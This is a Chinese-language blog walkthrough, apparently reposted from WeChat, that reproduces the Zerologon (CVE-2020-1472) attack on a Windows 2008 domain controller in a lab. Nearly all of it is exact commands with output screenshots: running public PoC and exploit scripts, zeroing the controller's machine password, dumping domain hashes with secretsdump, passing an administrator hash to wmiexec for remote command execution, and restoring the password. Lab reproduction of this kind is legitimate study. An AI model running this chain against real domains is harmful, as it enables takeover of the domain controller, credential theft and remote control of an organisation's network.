\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/VocwBdC6XpgosxrxpIR7EA)

**![](https://mmbiz.qpic.cn/mmbiz/Wqr9SokRcTWcKgdMIz6KrDJxEeibLFHr3yNgsRElic1xaian4Yp469kv3ZpkfOZeXORYpicEwAVoMqG7Mt7XFO1Jfg/640?wx_fmt=gif)**

**攻击机：kali2020      受害者：windows2008  
https://github.com/SecuraBV/CVE-2020-1472    poc  
https://github.com/dirkjanm/CVE-2020-1472     exp  
1、本地搭建一个域环境  
**

![](https://mmbiz.qpic.cn/mmbiz_png/Wqr9SokRcTUiaczkyuM7ONa8V6mlzJQFoRU91IXeCHqiaQiadgTXtJeoaoF7XJQkc2JM7nfIzPfjWDCz0amAPicnBQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Wqr9SokRcTUiaczkyuM7ONa8V6mlzJQFoAjRJdZkRuKb0snXUIDEAUPCnFVAj0Xia0beTCvGyg0MaxjWLDyREuzA/640?wx_fmt=png)

  
2、使用 poc 验证  
既然提示安装东西，那就   pip install -r requirements.txt  , 之后再执行     python3 zerologon\_tester.py <主机名> <ip>  

![](https://mmbiz.qpic.cn/mmbiz_png/Wqr9SokRcTUiaczkyuM7ONa8V6mlzJQFo5CaIJ2ialKoeZBOqKNLL5jTgBmJ4OY0TjcDTNCv39r45KzdicicpqyYicQ/640?wx_fmt=png)

  
3、使用 exp 攻击，但是这个时候很多人的脚本回报错，是因为缺少 impacket，https://github.com/SecureAuthCorp/impacket  ，python3 setup.py install  // 安装 impacket，然后执行 exp  
python3 cve-2020-1472-exploit.py owa 192.168.137.137  

![](https://mmbiz.qpic.cn/mmbiz_png/Wqr9SokRcTUiaczkyuM7ONa8V6mlzJQFoejfz0kpD0UzfseJyftgl7qCibHJ6cwBdA9x4DNgjf7M4GvsksEOuG4w/640?wx_fmt=png)

  
4、使用 impacket 的 secretsdump.py 导出域控制上的 hash  
python3 secretsdump.py god.org/owa\\$@192.168.137.137 -no-pass  

![](https://mmbiz.qpic.cn/mmbiz_png/Wqr9SokRcTUiaczkyuM7ONa8V6mlzJQFojgKE3xNJx1O2CH5I19gA2hrh5dT5XnOrYy09ngSwB91B2UP2Z8O6gA/640?wx_fmt=png)

  
5、利用获取到的管理员 hash 来远程操作域控服务器  
python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13cf6cfe1f2fc41cd286c7c8caec978b god.org/liukaifeng01@192.168.137.137  

![](https://mmbiz.qpic.cn/mmbiz_png/Wqr9SokRcTUiaczkyuM7ONa8V6mlzJQFoxg0pJWrZWR7y9snxdCvwKSLibGpaw30syKYy1bBOkUQJUsPZuo8OLSA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Wqr9SokRcTUiaczkyuM7ONa8V6mlzJQFoiamMoapOqYJiajMgcmXViaW8CzhEhrrtQoC7icXowjUibHoSgwScaiaRn2SA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Wqr9SokRcTUiaczkyuM7ONa8V6mlzJQFoXsiaT9bqvDn1VEcSJgVeCawSUkLtfGgQBIJtXv6h1zsn93qicWhT8CMQ/640?wx_fmt=png)

  
6、获取管理员 hash，远程连接导出 sam 数据库中的原来的计算机 hash  

![](https://mmbiz.qpic.cn/mmbiz_png/Wqr9SokRcTUiaczkyuM7ONa8V6mlzJQFoUL5KwROL1dt9rAXndsCHMw9GSmExo2MLdLl8BRCibIwvd15RiaDhJl5g/640?wx_fmt=png)

  
python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL  

![](https://mmbiz.qpic.cn/mmbiz_png/Wqr9SokRcTUiaczkyuM7ONa8V6mlzJQFondoqiaKgoBK2Yv9gx0EE0wbQs7To31TGPKmlJBEALQibiclF845DylQGA/640?wx_fmt=png)

  
7、恢复计算机的 hash  
下载脚本 https://github.com/risksense/zerologon  
python3 reinstall\_original\_pw.py owa 192.168.137.137 ad611ebf4fd2de9448a33ba693b212f4     // 注意 hash 的部分，只有后半部分  

![](https://mmbiz.qpic.cn/mmbiz_png/Wqr9SokRcTUiaczkyuM7ONa8V6mlzJQFoJYl3rL1EZyH86ichic8MXIbPHRg9ibdUncsn9whO6sBzZYDTsxUxovNnw/640?wx_fmt=png)

  
8、恢复计算机的 hash  
使用 impacket 的脚本来登录域控来验证 hash  
使用 7 步骤的脚本回复 hash 前  

![](https://mmbiz.qpic.cn/mmbiz_png/Wqr9SokRcTUiaczkyuM7ONa8V6mlzJQFoPxuFepLrxVDI0z4pLJPmgWaYEysfBsDFhiaCf9wRnEJp8KmBOoVRbzQ/640?wx_fmt=png)

  
使用 7 步骤脚本恢复 hash 后  

![](https://mmbiz.qpic.cn/mmbiz_png/Wqr9SokRcTUiaczkyuM7ONa8V6mlzJQFo1DDcQ6BlCYJvJVJWTQekdelibiagconspI3xYFicCOUDyibxte62sYJNMQ/640?wx_fmt=png)

********![](https://mmbiz.qpic.cn/mmbiz_png/Wqr9SokRcTWXcxZtiaMibnvovwBicjfhIibT2t5ty0s12WMUR6mvPjH8ibwXsF2bEt64NVvThjYgNvfctEOYB3UdYgA/640?wx_fmt=jpeg)********